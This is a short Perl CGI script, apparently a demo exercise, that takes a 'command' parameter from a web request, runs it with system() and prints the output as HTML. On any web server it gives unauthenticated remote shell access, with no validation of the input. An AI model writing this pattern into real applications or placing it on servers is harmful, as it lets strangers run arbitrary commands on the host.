#!/usr/bin/perl
print "content-type:text/html\n\n";
use CGI':standard';
$cmd=param("command");
print "<html><body bgcolor=lightgreen><center><b>";
print "output of the UNIX command is<br><br>";
system($cmd);
print"</b></center></body></html>";
